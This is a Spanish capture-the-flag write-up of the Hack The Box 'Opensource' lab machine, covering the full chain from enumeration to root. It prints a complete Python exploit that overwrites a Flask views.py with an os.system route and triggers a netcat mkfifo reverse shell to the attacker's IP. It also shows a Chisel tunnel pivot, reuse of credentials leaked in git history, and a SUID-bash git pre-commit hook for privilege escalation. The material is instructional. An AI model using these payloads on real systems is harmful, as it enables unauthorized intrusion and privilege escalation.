---
title: Hackthebox Writeup Opensource
date: 2022-06-28 12:07:13 am
categories: [HTB, Writeups]
tags: [HTB, Linux, Easy, Python Scripting, Cron job, pspy, Werkzeug, Leak Information, Git, Pivoting]

img_path: /assets/img/htb/writeups/opensource/
---

Entorno **Linux** con una aplicación en un servidor web con **Python** que permitía en uno de sus archivos implementar una funcionalidad agregando una nueva ruta para explotar **RCE (Remote code execution)** al subir el archivo y conseguir entrar a un contenedor. Luego creamos un tunel con **Chisel** para entrar a un servicio que no teniamos conexión, y luego gracias a una **Fuga de información (Information lekeage)** anteriormente extraída de un arhivo zip que ofrecia la web logramos entrar al servicio, extraer una **Private key** y entrar a la máquina víctima como cierto usuario. Para la escalada listamos procesos **Cron** con **pspy** y explotamos la ejecución de git usando **Git hooks** y conseguimos ser **root**

* * *

![OpensourceLogo](logo.png){: .shadow}

|   OS  |      IP      | Release Date | Difficulty | Points |
|:-----:|:------------:|:------------:|:----------:|:------:|
| Linux | 10.10.11.164 |  21 May 2022 |    Easy    |   20   |

* * *

Antes de empezar verificamos que estamos conectado a la **VPN** de HTB y tenemos conexión con la máquina:

```shell
> ping -c1 10.10.11.164
PING 10.10.11.164 (10.10.11.164) 56(84) bytes of data.
64 bytes from 10.10.11.164: icmp_seq=1 ttl=63 time=107 ms
                                          \______________________ Linux Machine
--- 10.10.11.164 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
          \_________________\____________________________________ Successful connection
rtt min/avg/max/mdev = 106.937/106.937/106.937/0.000 ms
```
{: .nolineno}

> Explicación de parámetros:
>
> -c \<count\> : Número de paquetes ICMP que deseamos enviar a la máquina

## Enumeration

* * *

Con `nmap` realizamos un escaneo de tipo **TCP (Transfer Control Protocol)** para descubrir puertos abiertos:

```console
❯ nmap -p- -sS --min-rate 5000 -n -Pn 10.10.11.164
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-28 13:01 -05
Nmap scan report for 10.10.11.164
Host is up (0.11s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   open     ssh      
                   \_________ Secure Shell Protocol
80/tcp   open     http     
                   \_________ HyperText Transfer Protocol
3000/tcp filtered ppp
		   \_________ Point-to-Point Protocol
```

> Explicación de parámetros :
{: .prompt-info }

> -p- : Escanear todos los puertos, del 1 al 65,535
>
> -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo
>
> \-\-min-rate \<number\> : Enviar una taza (\<number\>) de paquetes por segundo como mínimo 
>
> -n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS)
>
> -Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneo

Ahora procedemos a escanear los puertos **22(SSH) - 80(HTTP) - 3000(PPP)** en específico:

```console
❯ nmap -p22,80,3000 -sC -sV 10.10.11.164 -oN targetTCP                                                                                                        
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-28 17:49 -05                                                                                               
Nmap scan report for 10.10.11.164                                                                                                                             
Host is up (0.11s latency).                                                                                                                                   
                                                                                                                                                              
PORT     STATE    SERVICE VERSION                                                                                                                             
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)                                                                        
| ssh-hostkey:                                                                                                                                                
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)                                                                                                
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)                                                                                               
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)                                                                                             
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3                                                                                                        
| fingerprint-strings:                                                                                                                                        
|   GetRequest:                                                                                                                                               
|     HTTP/1.1 200 OK                                                                                                                                         
|     Server: Werkzeug/2.1.2 Python/3.10.3                                                                                                                    
|     Date: Tue, 28 Jun 2022 22:50:08 GMT                                                                                                                     
|     Content-Type: text/html; charset=utf-8                                                                                                                  
|     Content-Length: 1360                                                                                                                                    
|     Connection: close                                                                                                                                       
|     <html lang="en">                                                                                                                                        
|     <head>                                                                                                                                                  
|     <meta charset="UTF-8">                                                                                                                                  
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">                                                                                  
|     <title>upcloud - Upload files for Free!</title>                                                                                                         
|     <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script>                                                                                       
|     <script src="/static/vendor/popper/popper.min.js"></script>                                                                                             
|     <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>                                                                                    
|     <script src="/static/js/ie10-viewport-bug-workaround.js"></script>                                                                                      
|     <link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/>                                                                              
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/>                                                                        
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/>                                                                      
|     <link rel="
|   HTTPOptions:                                                                                                                                              
|     HTTP/1.1 200 OK                                                                                                                                         
|     Server: Werkzeug/2.1.2 Python/3.10.3                                                                                                                    
|     Date: Tue, 28 Jun 2022 22:50:09 GMT                                                                                                                     
|     Content-Type: text/html; charset=utf-8                                                                                                                  
|     Allow: HEAD, POST, OPTIONS, GET                                                                                                                         
|     Content-Length: 0                                                                                                                                       
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-title: upcloud - Upload files for Free!
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
3000/tcp filtered ppp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> Explicación de parámetros :
{: .prompt-info}

> -p \<port\_1,port\_2,\.\.\.> : Indicamos que puertos queremos escanear 
>
> -sC : Ejecutar en los puertos scripts por defecto de nmap
> 
> -sV : Activar detección de versiones de los servicios que corren por los puertos
>
> -oN \<file\> : Guardar el output del escaneo en un archivo con formato Nmap

Ya que no disponemos de credenciales para entrar por **SSH**, empezamos con el servicio web que corre por el puerto **80 (HTTP)**:

> Para empezar de manera rápida usamos `whatweb` para ver tecnologías del sitio

```console
❯ whatweb 10.10.11.164
http://10.10.11.164 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTTPServer[Werkzeug/2.1.2 Python/3.10.3], IP[10.10.11.164], JQuery[3.4.1], Python[3.10.3], Script, Title[upcloud - Upload files for Free!], Werkzeug[2.1.2]
```

> Si quieres una opción gráfica puedes usar en tu navegador la extensión [Wappalyzer](https://www.wappalyzer.com/apps/) y ver las tecnologías
{: .prompt-tip}

De primeras observamos que en el servicio web corre `Werkzeug`, pero qué es?

![Werkzeug](werkzeug_concept.png){: .shadow}

Encontes, el sustantivo en alemán **Werkzeug = herramienta** es una biblioteca de aplicaciones web **WSGI**, pero este último qué es?

![WSGI](wsgi_concept.png){: .shadow}

Entonces, `WSGI (Web Server Gateway Interface)` es una especificación de interfaz (protocolo ó convención) que permite la comunicación entre un servidor web y una aplicación web, basado en una serie de reglas para cualquier inconveniente de comunicación.

> Documentación de `Werkzeug` para mayor información: [https://werkzeug.palletsprojects.com/en/2.1.x/](https://werkzeug.palletsprojects.com/en/2.1.x/)
{: .prompt-tip}

> Con `Firefox` podemos ver el sitio web

![HttpWeb](http_web.png){: .shadow}

Existen algunos problemas al mostrar la página principal, pero en resumen esta web nos habla de una aplicación llamada `Upcloud` que nos permite subir archivos de manera online (como observamos en la imagen anterior), y también nos permite descargar su contenido para usarla de manera local, lo cuál es bastante peligroso...

Primero testeamos un poco el funcionamiento de este servicio:

> Subiendo un archivo

![Testing](web_testing_0.png){: .shadow}

Solo observamos la ruta en la que se almacenaran los archivos subidos

> Subiendo ningún archivo

![Testing](web_testing_1.png){: .shadow}

Ya que sabemos que se está usando `Python`, basado en las rutas del error, tiene sentido que se use el microframework `Flask` que permite crear aplicaciones web de todo tipo. 

Además de muchas funciones de error, podemos ver la ruta de la aplicación __/app/public/uploads/__ que como vimos antes podría almacenar los archivos subidos

Para quitarnos las dudas procedemos a examinar el archivo comprimido de la aplicación que nos proporcinaba la web:

Usamos `unzip` para extraer todos los archivos:

```console
❯ unzip -q source.zip
	 \_________________ quite mode
❯ ls -a
       \______ show hidden files
 .   ..   .git   app   config   build-docker.sh   Dockerfile   source.zip
            |     |_______|           |                |            \________ compressed file
	    |         |               |                |
	    |	      |	              |                |___ simple text file that contains a list of commands that the Docker client calls while creating an image
	    |         |               | 
	    |         |               |___ script that build an image from a Dockerfile
	    |         |
	    |         |___ Upcloud app files
	    |        
	    |___ folder that contains all the information that is necessary for your project in version control
```

Observamos que hay un script para montarnos de manera local la aplicación en un contenedor usando `Docker`, pero qué es?

![Docker](docker_concept.png){: .shadow}

En resumen, [Docker](https://www.ibm.com/cloud/learn/docker) que significa **Estibador (persona encargada de cargar y descargar mercancias de embarcaciones)**, es una herramienta que permite empaquetar una aplicación y sus dependencias en un contenedor muy ligero. Existe un confusión respecto a las máquinas virtuales, pero dejemos en claro una diferencia:

> Container
>
> Son una abstracción de la capa de aplicación que empaqueta el código y sus dependencias
>
> ---------------------------
> Virtual Machine (VM)
>
> Son una abstracción del hardware físico que converte un servidor en muchos servidores

> En general los contenedores **ocupan menos espacio y arrancan más rapido** ya que virtualizan la parte del hardware
{: .prompt-tip}

Aparte de eso, encontramos el directorio `.git`, el cuál significa que existen diferentes versiones del proyecto las cuales podemos ver y examinar

Entramos al directorio y buscamos los `logs` con el comando `git log` para ver los diferentes cambios __"commits"__ que se han hecho, pero no encontramos nada

Entonces examinamos las ramas o **branches (ramas del estado del código que crean un nuevo camino para la evolución del mismo)** que existen:

```console
❯ git branch
  dev
* public
❯ git log dev -p
*********************
***************
**********
diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json             
deleted file mode 100644               
index 5975e3f..0000000                                                         
--- a/app/.vscode/settings.json
+++ /dev/null                         
@@ -1,5 +0,0 @@                        
-{                 
-  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",                                                                             
-  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/", 
			       \______________ posible credentials !
-  "http.proxyStrictSSL": false
-}                    
                                       
commit a76f8f75f7a4a12b706b0cf9c983796fa1985820                                
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:16 2022 +0200
**************************
***************************
*******************
```

Con el comando `git branch` logramos encontrar dos ramas, y al ver las diferencias de cada commit con el comando `git log <branch_name> -p` encontramos unas credenciales de un posible usuario `dev01`

Ahora intentamos examinar los archivos de la aplicación para entender su funcionamiento, y aquí una pista del nombre la máquina **Opensource**

> Opensource
>
> Es un codigo diseñado para el acceso publico. De manera colaborativa distintas comunidades pueden ver y modifcar el codigo para su mejora continua

Examinamos el directorio `config` y encontramos el archivo `supervisord.conf`

> Supervidord
>
> Sistema cliente/servidor que permite controlar los procesos/servicios dentro de un sistema UNIX

```console
[supervisord]
user=root
nodaemon=true
logfile=/dev/null
logfile_maxbytes=0
pidfile=/run/supervisord.pid

[program:flask]
command=python /app/run.py
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0
```

Podemos observar que el usuario `root` ejecutara el comando `python /app/run.py`, el cuál posiblemente inicia el funcionamiento de la aplicación

Ahora examinamos el directorio `app` y efectivamente, ese archivo inicia todo el proceso pero además importa mas archivos en otro directorio también llamado `app`

Después de analizar cada archivo logramos entender como es el funcionamiento y la posible brecha que podemos explotar

Con el conocimiento del microframework `Flask` podemos usar a nuestro favor el siguiente archivo `views.py`:

```python
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
```

Lo que observamos son las diferentes rutas del servicio web y sus respectivas funciones que se ejecutarán al acceder a estas. Además, anteriormente en el mensaje de error logramos ver que se trabaja con el archivo en la ruta `/app/app/views.py` el cuál es este mismo. Entonces.... que pasa si subimos el archivo modificandolo y logramos reemplazarlo con el original?

## Foothold

* * *

Lo que haremos será agregar una nueva ruta al archivo `views.py` y con ello la funcionalidad, insertando un parametro por get, para realizar ejecución remota de comandos **RCE (Remote command execution)**, luego la subiremos por la aplicación `Upcloud`, pero antes de eso (g.e interceptando por __Burpsuite__), ya que sabemos su ruta exacta, cambiamos su nombre por aquella ruta y así reemplazará al archivo original pero con nuestra funcionalidad agregada. Para ello hice un script en `Python` para automatizar todo el proceso:

```python
import requests, signal, sys, subprocess, shlex, argparse, time
from pwn import *

# testing
import pdb

# ctrl + c (function)
def signal_handler(signum, frame):
    log.failure("Interruption"); sys.exit()

# ctrl + c (event)
signal.signal(signal.SIGINT, signal_handler)

# global variables
target_url = "http://10.10.11.164:80/upcloud"
file_path_name = "/app/app/views.py" # important!

# arguments
parser = argparse.ArgumentParser(description='Reverse shell to container')
parser.add_argument('-ip', type=str, required=True, help='ip address to receive shell')
parser.add_argument('-port', type=int, required=True, help='port to receive shell' )

args = parser.parse_args()

# malicious function
# - - - - - - - - - - 
#   revshell_function = """
#                app.route('/reverse')
#                def shell():
#                    return os.system(request.args.get['cmd'])
#           """

# create malicious file
def create_file():
    try:
        open('views.py')
    except FileNotFoundError:
        with open('views.py', 'w') as file:
            file.write("""import os\nfrom app.utils import get_file_name\nfrom flask import render_template, request, send_file\nfrom app import app\n\n@app.route('/', methods=['GET', 'POST'
])\ndef upload_file(): #hacked\n\tif request.method == 'POST':\n\t\tf = request.files['file']\n\t\tfile_name = get_file_name(f.filename)\n\t\tfile_path = os.path.join(os.getcwd(), "public", 
"uploads", file_name)\n\t\tf.save(file_path)\n\t\treturn render_template('success.html', file_url=request.host_url + "uploads/" + file_name)\n\treturn render_template('upload.html')\n\n@app.
route('/uploads/<path:path>')\ndef send_report(path):\n\tpath = get_file_name(path)\n\treturn send_file(os.path.join(os.getcwd(), "public", "uploads", path))\n\n@app.route('/reverse')\ndef s
hell():\n\treturn os.system(request.args.get('cmd'))""")

# upload file with malicious function
def request_POST(p):
    time.sleep(2)
    p.status('Getting reverse shell...')
    create_file()
    try:
        files = { 'file' : (file_path_name, open('views.py', 'rb'), 'text/x-python') }
        r = requests.post(target_url, files=files)
    except Exception as e:
        p.failure(" {} ocurred.".format(e))
    log.info('File upload')
    return p

# get reverse shell
def get_shell(p):
    time.sleep(2)
    log.info('Listen on PORT {} to receive the shell'.format(args.port))
    input('Press enter to continue')
    try:
        log.info('Inserting payload to reverse shell')
        payload = 'http://10.10.11.164/reverse?cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+{}+{}+>/tmp/f'.format(args.ip, args.port)
        subprocess.run(shlex.split('/usr/bin/curl {}'.format(payload)), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        p.failure(" {} ocurred.".format(e))
    p.success('Successful reverse shell')

if __name__ == '__main__':
    p = log.progress('Starting attack')
    get_shell(request_POST(p))
```

> Puedes descargar el script en mi repositorio [https://github.com/E1P0TR0](https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/Auto-tool_Opensource/reverseShell.py)
{: .prompt-info}

Ejecutamos el script `python3 exploit.py -ip <ip-address> -port <local_port>` nos ponemos en escucha por el puerto especificado y logramos entrar al contenedor como `root`:

```console
──────────────────────────────────────────────────────
❯ python3 exploit.py -ip 10.10.14.181 -port 4444
[+] Starting attack: Successful reverse shell
[*] File upload
[*] Listen on PORT 4444 to receive the shell
Press enter to continue
[*] Inserting payload to reverse shell
──────────────────────────────────────────────────────
❯ rlwrap nc -lvnp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.164.
Ncat: Connection from 10.10.11.164:45805.
/bin/sh: can't access tty; job control turned off
whoami
root
/app # 
```

> Usamos el comando `rlwrap` para de alguna manera recibir una shell un poco mas funcional, pero es mas recomendable hacer un __tratamiento de la tty__
{: .prompt-tip}

Ya en el contenedor procedemos a hacer un reconocimiento básico y haciendo un listado del `/etc/passwd` vemos que el usuario usa una shell de Unix ligera llamada **ash**

Viendo la configuración de la interfaz de red con `ifconfig` observamos que no nos encontramos en la máquina víctima sino en el contenedor pero que debería tener una conexión. Además observamos que nos encontramos en la red `172.17.0.7/16` y podemos asumir que la `172.17.0.1` actua como **Gateway (puerta de enlace)** y por ende la máquina vítima, pero qué es un **Gateway**?

> Gateway
>
> Es un dispositivo, mayormente un ordenador, que actua como traductor de dos sistemas que no utilizan los mismos protocolos. También ayuda a establecer la comunicacion entre multiples entornos, osea entre equipos de diferentes redes

Con está información y sabiendo que puertos tiene abiertos la máquina, usamos `nc 172.17.0.1 <port>` para validar que tiene abierto/filtrado los puertos **22, 80, 3000**:

```console
/app # nc 172.17.0.1 80 -v  
172.17.0.1 (172.17.0.1:80) open <-- open port !



nc: too many output retries
/app # nc 172.17.0.1 3000 -v
172.17.0.1 (172.17.0.1:3000) open <-- open port !

HTTP/1.1 400 Bad Request
Content-Type: text/plain; charset=utf-8
Connection: close

400 Bad Request

nc: too many output retries
/app # nc 172.17.0.1 22 -v
172.17.0.1 (172.17.0.1:22) open <-- open port !
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7
```

Comprobamos que la `172.17.0.1` es la `10.10.11.164` y tenemos el puerto **3000** abierto pero solo tenemos una conexión desde el contenedor pero no de nuestra máquina local. Pero existe solución a eso usando la técnica de **Remote port forwarding** para enrutar el tráfico de la máquina víctima por su puerto **3000** a un puerto local nuestro **(e.g 3000)** y poder ver que servicio existe

Para aplicar la técnica procedemos a usar la herramienta `Chisel`:

> Instalación para disminuir considerablemente el ejecutable y mantener su funcionalidad

```console
❯ gunzip chisel_1.7.7_linux_amd64.gz
❯ mv chisel_1.7.7_linux_amd64 chisel
❯ du -hc chisel
7.8M    chisel  	
7.8M    total		<------ initial size
❯ chmod +x chisel
❯ upx chisel
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
   8077312 ->   3107968   38.48%   linux/amd64   chisel                        

Packed 1 file.
❯ du -hc chisel
3.0M    chisel
3.0M    total		<------ final size

```

Ahora solo copiamos el executable a la máquina víctima y creamos el tunel:

> Aplicación de `Remote port forwarding`

```console
❯ ./chisel server -p 8080 --reverse 				<------ Máquina atacante
2022/06/29 15:02:02 server: Reverse tunnelling enabled
2022/06/29 15:02:02 server: Fingerprint 1R58OXwRvuvhMHAl4v/FHZtVmD14WxmMw9BPFeAijBs=
2022/06/29 15:02:02 server: Listening on http://0.0.0.0:8080
2022/06/29 15:02:09 server: session#1: tun: proxy#R:3000=>172.17.0.1:3000: Listening

────────────────────────────────────────────────────────────────────────────────────────
/tmp # ./chisel client 10.10.14.181:8080 R:3000:172.17.0.1:3000 <------ Máquina víctima
2022/06/29 20:02:10 client: Connecting to ws://10.10.14.181:8080
2022/06/29 20:02:11 client: Connected (Latency 108.331821ms)
```

> Puedes descargar la herramienta en el siguiente repositorio [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
{: .prompt-tip}

Ahora entramos a nuestro `localhost` por el puerto `3000`:

![giteaWeb](gitea_web_rpf.png)

Viendo la página y buscando en internet sabemos que **Gitea** es un software "opensource" de control de versiones, similar a **Github**. Además vemos un panel para logearnos, y probando las credenciales que también son parte de un usuario con un repositorio **git** logramos acceder como `dev01`. Luego logramos ver un repositorio de un `backup` de su directorio `home` y con ello su `private key (id_rsa)` 

![backup repository](backup_home_rpf.png)

Ahora solo nos descargamos esa llave, le damos sus respectivos permisos como clave privada `chmod 600 <private_key>`, logramos logearnos y conseguir la flag:

```console
❯ chmod 600 id_rsa
❯ ssh -i id_rsa dev01@10.10.11.164
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-176-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jun 29 20:42:21 UTC 2022

  System load:  0.34              Processes:              238
  Usage of /:   75.8% of 3.48GB   Users logged in:        1
  Memory usage: 25%               IP address for eth0:    10.10.11.164
  Swap usage:   0%                IP address for docker0: 172.17.0.1


16 updates can be applied immediately.
9 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Last login: Wed Jun 29 18:21:55 2022 from 10.10.16.22
-bash-4.4$ find / -name flag.txt 2>/dev/null | xargs ls -l
total 4
-rw-r----- 1 root dev01 33 Jun 29 18:12 user.txt
```

## Privilege Escalation

* * *

Para escalar privilegios empezamos con un reconocimiento básico del sistema operativo, ver que usuarios existen, archivos con permisos `SUID`, archivos que podemos ejecutar como usuario `root`, etc. Al final no conseguimos algo interesante y como es una máquina fácil podemos tirar de la herramienta `pspy` para listar procesos del sistema sin ser usuario `root`

Lo descargamos, lo pasamos a la máquina víctima, lo ejecutamos en una ruta con permisos y encontramos algo interesante:

```console
bash-4.4$ ./pspy64                                                                                                                                   [507/507]
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855                                                                                 
                                                                                                                                                              
                                                                                                                                                              
     ██▓███    ██████  ██▓███ ▓██   ██▓                                                                                                                       
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒                                                                                                                       
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░                                                                                                                       
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░                                                                                                                       
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░                                                                                                                       
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒                                                                                                                        
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░                                                                                                                        
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░                                                                                                                         
                   ░           ░ ░                                                                                                                            
                               ░ ░                                                                                                                            
                                                                                                                                                              
Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching d
irectories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)                                                                                 
Draining file system events due to startup...                                                                                                                 
done 
*********************************************
***********************************************************
*****************************************************
2022/06/29 21:45:01 CMD: UID=0    PID=7453   | /usr/sbin/CRON -f 
2022/06/29 21:45:01 CMD: UID=0    PID=7452   | /usr/sbin/CRON -f 
2022/06/29 21:45:01 CMD: UID=0    PID=7455   | git status --porcelain 
2022/06/29 21:45:01 CMD: UID=0    PID=7454   | /bin/bash /usr/local/bin/git-sync 
2022/06/29 21:45:01 CMD: UID=???  PID=7457   | 
2022/06/29 21:45:01 CMD: UID=0    PID=7458   | git commit -m Backup for 2022-06-29 
2022/06/29 21:45:01 CMD: UID=0    PID=7461   | git push origin main 
2022/06/29 21:45:01 CMD: UID=0    PID=7462   | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 
*************************************************************
**************************************************
********************************************************
```

> Puedes decargar la herramienta en el siguiente repositorio [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)
{: .prompt-info}

Observamos que existe un proceso donde el usuario `root` está ejecutando comandos con `git`. Averiguando posibles vulnerabilidades encontramos que al utilizar `git hooks` para ejecutar comandos, pero qué es exactamente?

> Git hooks
>
> Son scripts automatizados al utilizar comandos git, osea, se enganchan a comandos de git (g.e __git commit, git add, git push__)

> Mas información sobre [Git Hooks](https://medium.com/@gonzaloandres.diaz/escribiendo-codigo-de-alta-calidad-en-python-parte-3-hooks-f3970a4bcdd7)
{: .prompt-info}

> Página de binarios Unix que pueden ser explotados como `git` [https://gtfobins.github.io/gtfobins/git/](https://gtfobins.github.io/gtfobins/git/)
{: .prompt-info}

Al iniciar un repositorio, estos scripts se almacenan en la ruta `.git/hooks` y sus respectivos nombres descriptivos `.sample` de acuerdo a la acción que realizarán. Para **activar** su ejecución solo debemos quitarle la terminación `.sample`

Observamos que se está ejecutando `git commit -m ...`, luego se hace un `push` y un `git remote` sobre el repositorio del usuario `dev01`. Con esa información podemos deducir que debemos aplicar está explotación sobre ese repositorio que tenemos en la ruta `home/dev01/.git`, con lo cuál podemos usar el script `pre-commit.sample` almacenado en `/hooks`, insertar que se asigne **permisos SUID al a la bash** y luego acceder como su propietario `root` y obtener la flag:

```console
bash-4.4$ pwd
/home/dev01/.git/hooks
bash-4.4$ ls -l /bin/bash 	<------------------------------------ check bash permissions (not SUID)
-rwxr-xr-x 1 root root 1113504 Apr 18 15:08 /bin/bash
bash-4.4$ head -n 5 pre-commit.sample 	  <-------------------------- check hook (script) to be executed before commit command
#!/bin/sh
#
# An example hook script to verify what is about to be committed.
# Called by "git commit" with no arguments.  The hook should
# exit with non-zero status after issuing an appropriate message if
bash-4.4$ sed -i "2i chmod u+s /bin/bash" pre-commit.sample <-------- add in the second line command to assign SUID permissions to bash
bash-4.4$ head -n 5 pre-commit.sample 	  <-------------------------- check changes
#!/bin/sh
chmod u+s /bin/bash
#
# An example hook script to verify what is about to be committed.
# Called by "git commit" with no arguments.  The hook should
bash-4.4$ mv pre-commit.sample pre-commit	<---------------------- rename to activate the script and root run it
bash-4.4$ ls -l /bin/bash	<-------------------------------------- check bash permissions (SUID)
-rwsr-xr-x 1 root root 1113504 Apr 18 15:08 /bin/bash
bash-4.4$ bash -p 		<-------------------------------------- run bash as the owning user (root user)
bash-4.4# whoami
root
bash-4.4# find / -name root.txt | xargs ls -l
-rw-r----- 1 root root 33 Jun 29 18:12 /root/root.txt
bash-4.4# 
``` 
